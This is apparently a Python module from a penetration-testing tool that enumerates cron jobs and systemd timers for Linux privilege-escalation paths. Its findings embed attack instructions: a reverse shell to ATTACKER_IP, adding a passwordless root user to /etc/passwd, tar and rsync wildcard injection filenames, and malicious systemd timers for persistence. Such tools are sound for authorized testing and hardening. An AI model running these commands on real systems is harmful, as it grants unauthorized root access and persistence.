"""
Cron Jobs Enumerator
====================

Enumerate cron jobs for privilege escalation.

Cron jobs that run as root with writable scripts are a goldmine.
Look for world-writable scripts, missing scripts, and PATH hijacking.
"""

import os
from pathlib import Path
from typing import List, Dict, Optional, Tuple

from ..core.base import BaseEnumerator
from ..core.findings import FindingSeverity


class CronEnumerator(BaseEnumerator):
    """
    Enumerate cron jobs and scheduled tasks.

    Checks:
    - /etc/crontab
    - /etc/cron.d/*
    - /etc/cron.{hourly,daily,weekly,monthly}
    - /var/spool/cron/crontabs/*
    - Writable cron scripts
    - Missing scripts (create and own)
    - PATH hijacking in cron
    """

    name = "Cron Jobs Enumerator"
    description = "Find cron-based privilege escalation vectors"

    # Cron locations to check
    CRON_PATHS = [
        '/etc/crontab',
        '/etc/cron.d',
        '/etc/cron.hourly',
        '/etc/cron.daily',
        '/etc/cron.weekly',
        '/etc/cron.monthly',
        '/var/spool/cron/crontabs'
    ]

    def enumerate(self) -> None:
        """Run cron enumeration"""
        self.print_header()

        self._check_main_crontab()
        self._check_cron_directories()
        self._check_user_crontabs()
        self._check_systemd_timers()

    def _check_main_crontab(self) -> None:
        """Check /etc/crontab for misconfigurations"""
        self.log("Checking /etc/crontab...")

        crontab_path = '/etc/crontab'

        if not os.path.exists(crontab_path):
            self.log("/etc/crontab not found", "info")
            return

        try:
            with open(crontab_path, 'r') as f:
                content = f.read()

            self.log("/etc/crontab contents:", "success")
            print(content)

            self._analyze_cron_content(content, crontab_path)

        except PermissionError:
            self.log("/etc/crontab not readable", "warning")

    def _check_cron_directories(self) -> None:
        """Check cron directories for writable scripts"""
        self.log("Checking cron directories...")

        for cron_dir in ['/etc/cron.d', '/etc/cron.hourly', '/etc/cron.daily',
                         '/etc/cron.weekly', '/etc/cron.monthly']:

            if not os.path.exists(cron_dir):
                continue

            if not os.path.isdir(cron_dir):
                continue

            self.log(f"Checking {cron_dir}/")

            try:
                for item in os.listdir(cron_dir):
                    item_path = os.path.join(cron_dir, item)

                    if os.path.isfile(item_path):
                        self._analyze_cron_file(item_path)

            except PermissionError:
                self.log(f"Cannot read {cron_dir}/", "warning")

    def _analyze_cron_file(self, path: str) -> None:
        """Analyze a cron file for vulnerabilities"""
        try:
            with open(path, 'r') as f:
                content = f.read()

            self._analyze_cron_content(content, path)

        except PermissionError:
            pass

    def _analyze_cron_content(self, content: str, source_file: str) -> None:
        """Analyze cron content for privilege escalation vectors"""
        lines = content.split('\n')

        for line in lines:
            line = line.strip()

            # Skip comments and empty lines
            if not line or line.startswith('#'):
                continue

            # Skip variable assignments
            if '=' in line and not line[0].isdigit() and line[0] != '*':
                # Check for PATH variable
                if line.startswith('PATH='):
                    self._check_cron_path(line.split('=', 1)[1])
                continue

            # Parse cron entry
            parts = line.split()

            if len(parts) < 6:
                continue

            # Extract user and command (format: min hour dom mon dow user command)
            # or (format: min hour dom mon dow command) for user crontabs

            # Try to determine if this is a system crontab (with user field)
            potential_user = parts[5] if len(parts) > 6 else None

            if potential_user and potential_user in ['root', 'daemon', 'www-data']:
                user = potential_user
                command = ' '.join(parts[6:])
            else:
                # Assume it's a user crontab
                user = 'current'
                command = ' '.join(parts[5:])

            # Only interested in root cron jobs
            if user == 'root':
                self._check_cron_command(command, source_file, line)

    def _check_cron_command(self, command: str, source_file: str, full_line: str) -> None:
        """Check a cron command for vulnerabilities"""
        # Extract scripts from command (look for paths)
        scripts = self._extract_script_paths(command)

        for script_path in scripts:
            # Check if script exists and is writable
            if os.path.exists(script_path):
                if os.access(script_path, os.W_OK):
                    self.log(f"WRITABLE root cron script: {script_path}", "critical")

                    self.add_finding(
                        category="Writable Cron Script",
                        severity=FindingSeverity.CRITICAL,
                        finding=f"Root cron job executes writable script",
                        exploitation=(
                            f"Modify {script_path} to execute payload:\n"
                            f"  echo '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> {script_path}\n"
                            f"  # Or add new root user:\n"
                            f"  echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd"
                        ),
                        impact="Critical - Root code execution on next cron run",
                        target=script_path,
                        source_file=source_file,
                        cron_line=full_line
                    )

                # Check if script directory is writable
                script_dir = os.path.dirname(script_path)

                if script_dir and os.access(script_dir, os.W_OK):
                    self.log(f"Writable directory for cron script: {script_dir}", "warning")

                    self.add_finding(
                        category="Writable Cron Directory",
                        severity=FindingSeverity.HIGH,
                        finding=f"Directory containing cron script is writable",
                        exploitation=(
                            f"Replace script or create symlink:\n"
                            f"  mv {script_path} {script_path}.bak\n"
                            f"  # Create malicious script with same name"
                        ),
                        impact="High - Potential script replacement",
                        target=script_dir,
                        script=script_path
                    )

            else:
                # Script doesn't exist - can we create it?
                script_dir = os.path.dirname(script_path)

                if script_dir and os.path.exists(script_dir) and os.access(script_dir, os.W_OK):
                    self.log(f"Missing cron script in writable directory: {script_path}", "critical")

                    self.add_finding(
                        category="Missing Cron Script",
                        severity=FindingSeverity.CRITICAL,
                        finding=f"Root cron job references missing script in writable directory",
                        exploitation=(
                            f"Create the missing script:\n"
                            f"  echo '#!/bin/bash' > {script_path}\n"
                            f"  echo '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> {script_path}\n"
                            f"  chmod +x {script_path}"
                        ),
                        impact="Critical - Create script for root execution",
                        target=script_path,
                        source_file=source_file
                    )

        # Check for wildcard injection
        if '*' in command:
            self._check_wildcard_injection(command, source_file)

    def _extract_script_paths(self, command: str) -> List[str]:
        """Extract file paths from a command string"""
        paths = []
        parts = command.split()

        for part in parts:
            # Clean up the part
            part = part.strip(';').strip('&').strip('|').strip('"').strip("'")

            if part.startswith('/') and not part.startswith('/dev/'):
                paths.append(part)

        return paths

    def _check_cron_path(self, path_value: str) -> None:
        """Check cron PATH for hijacking opportunities"""
        self.log(f"Cron PATH: {path_value}")

        path_dirs = path_value.split(':')

        for directory in path_dirs:
            directory = directory.strip()

            if directory and os.path.exists(directory):
                if os.access(directory, os.W_OK):
                    self.log(f"Writable cron PATH directory: {directory}", "warning")

                    self.add_finding(
                        category="Writable Cron PATH",
                        severity=FindingSeverity.HIGH,
                        finding=f"Cron PATH contains writable directory",
                        exploitation=(
                            f"Place malicious binary in {directory}:\n"
                            f"  # If cron runs 'command', create:\n"
                            f"  echo '#!/bin/bash' > {directory}/command\n"
                            f"  echo 'id > /tmp/pwned' >> {directory}/command\n"
                            f"  chmod +x {directory}/command"
                        ),
                        impact="High - Command hijacking in cron jobs",
                        target=directory
                    )

    def _check_wildcard_injection(self, command: str, source_file: str) -> None:
        """Check for wildcard injection vulnerabilities"""
        # Common wildcard injection scenarios
        if 'tar' in command and '*' in command:
            self.add_finding(
                category="Cron Wildcard - Tar",
                severity=FindingSeverity.HIGH,
                finding="Tar with wildcard in cron job",
                exploitation=(
                    "Create checkpoint action files:\n"
                    "  touch '/path/--checkpoint=1'\n"
                    "  touch '/path/--checkpoint-action=exec=sh payload.sh'\n"
                    "  # Create payload.sh with reverse shell"
                ),
                impact="High - Arbitrary code execution via tar checkpoint",
                target=command,
                source_file=source_file
            )

        elif 'rsync' in command and '*' in command:
            self.add_finding(
                category="Cron Wildcard - Rsync",
                severity=FindingSeverity.HIGH,
                finding="Rsync with wildcard in cron job",
                exploitation=(
                    "Create rsync options as filenames:\n"
                    "  touch '/path/-e sh payload.sh'"
                ),
                impact="High - Arbitrary code execution via rsync",
                target=command,
                source_file=source_file
            )

    def _check_user_crontabs(self) -> None:
        """Check user crontabs"""
        self.log("Checking user crontabs...")

        # Check current user's crontab
        output = self.run_command("crontab -l 2>/dev/null")

        if output and 'no crontab' not in output.lower():
            self.log("Current user has crontab:", "success")
            print(output)

        # Check /var/spool/cron/crontabs/
        crontabs_dir = '/var/spool/cron/crontabs'

        if os.path.exists(crontabs_dir):
            try:
                for user in os.listdir(crontabs_dir):
                    user_crontab = os.path.join(crontabs_dir, user)

                    if os.access(user_crontab, os.R_OK):
                        self.log(f"Readable crontab for {user}", "info")

                        if user == 'root':
                            self.add_finding(
                                category="Root Crontab Readable",
                                severity=FindingSeverity.LOW,
                                finding="Root's crontab is readable",
                                exploitation="Read to find scheduled commands and scripts",
                                impact="Low - Information disclosure",
                                target=user_crontab
                            )
            except PermissionError:
                pass

    def _check_systemd_timers(self) -> None:
        """Check systemd timers (modern cron replacement)"""
        self.log("Checking systemd timers...")

        output = self.run_command("systemctl list-timers --all 2>/dev/null")

        if output and 'NEXT' in output:
            self.log("Active systemd timers:")
            print(output)

            # Look for writable timer-related files
            timer_dirs = [
                '/etc/systemd/system',
                '/usr/lib/systemd/system'
            ]

            for timer_dir in timer_dirs:
                if os.path.exists(timer_dir) and os.access(timer_dir, os.W_OK):
                    self.add_finding(
                        category="Writable Systemd Directory",
                        severity=FindingSeverity.HIGH,
                        finding=f"Systemd directory is writable: {timer_dir}",
                        exploitation=(
                            "Create malicious timer and service:\n"
                            f"  Create {timer_dir}/malicious.timer\n"
                            f"  Create {timer_dir}/malicious.service\n"
                            "  systemctl enable malicious.timer"
                        ),
                        impact="High - Create persistent root execution",
                        target=timer_dir
                    )